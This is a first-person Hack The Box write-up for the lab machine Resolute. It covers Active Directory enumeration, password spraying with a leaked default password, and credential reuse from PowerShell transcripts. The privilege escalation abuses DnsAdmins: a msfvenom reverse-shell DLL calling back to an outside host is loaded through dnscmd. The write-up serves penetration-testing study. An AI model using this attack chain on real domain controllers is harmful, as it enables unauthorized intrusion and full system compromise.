# HTB - Resolute

#### Ip: 10.10.10.169
#### Name: Resolute
#### Difficulty: Medium

----------------------------------------------------------------------

Resolute.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.169 -sC -sV   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 14:49 CDT
Nmap scan report for 10.10.10.169
Host is up (0.066s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-08 19:56:55Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49713/tcp open  msrpc        Microsoft Windows RPC
57023/tcp open  unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m31s, median: 6m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-09-08T12:57:47-07:00
| smb2-time: 
|   date: 2023-09-08T19:57:44
|_  start_date: 2023-09-08T10:58:56
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.02 seconds
```

With ports 53 and 88 open it looks like we've got a domain controller here. 

Lets add megabank.local to our `/etc/hosts` file. 

Kicking off enum4linux with:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ enum4linux -a megabank.local
```

We find an interesting user description:

```text
Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
```

Nice, looks like we've got a password here.

Enum4linux also finds a list of users as well:

users.png

### Exploitation

Lets add these to a file called users.txt and try to spray the password we've found against this list:

spray.png

Cool, like like we've got a hit for user melanie. Lets try logging in with Evil-Winrm:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ evil-winrm -i megabank.local -u melanie -p 'Welcome123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> hostname
Resolute
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```
From here we can grab the user.txt flag:

user_flag.png

### Privilege Escalation

Looking around the box for a bit and not seeing much, I realize there are hidden files in the `C:\` drive that can only be accessed by issueing the `-force` arguement:

```text
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows


*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         9/8/2023   3:58 AM      402653184 pagefile.sys
```

Inside the `PSTranscripts` folder we find some interesting PowerShell logs/transcripts..

creds.png

Nice, we've disovered more credentials!

Lets use these with Evil-WinRM to logon as user ryan:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ evil-winrm -i megabank.local -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> hostname
Resolute
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
```

Running `whoami /groups` we see that user ryan is in the DnsAdmins group:

groups.png

Nice, this should be easily exploitable.

First we'll need to create a reverse shell dll file using msfvenom:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=443 -f dll > shell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

Next I'll startup an SMB server:

```text
┌──(ryan㉿kali)-[~/HTB/Resolute]
└─$ impacket-smbserver ryan .
```

From here on the target I can run:

```text
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.72\ryan\shell.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1316
        FLAGS              :
```

I can confirm the file was downloaded from the SMB share, and I can now access the final root.txt flag as nt authority\ system:

root_flag.png

Thanks for following along!

-Ryan

------------------------------------------------------